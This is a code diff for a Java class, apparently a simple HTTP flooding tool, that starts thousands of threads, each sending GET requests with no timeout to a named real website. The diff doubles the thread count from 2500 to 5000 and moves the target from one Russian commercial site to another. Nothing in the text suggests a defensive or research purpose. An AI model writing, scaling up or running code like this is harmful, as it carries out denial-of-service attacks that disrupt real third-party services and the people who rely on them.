@@ -10,7 +10,7 @@ public class HeyBabe implements Runnable {
     }
 
     private static void extracted() {
-        for (int i = 0; i < 2500; i++) {
+        for (int i = 0; i < 5000; i++) {
             final HeyBabe heyBabe = new HeyBabe();
             final Thread thread = new Thread(heyBabe);
 
@@ -22,7 +22,7 @@ public class HeyBabe implements Runnable {
         Unirest.setTimeouts(0, 0);
         HttpResponse<String> response = null;
         try {
-            response = Unirest.get("https://vektor-penza.ru")
+            response = Unirest.get("https://dostavista.ru")
                     .asString();
             if (nonNull(response) && response.getStatus() == 200) {
                 System.out.println("Status code " + response.getStatus());
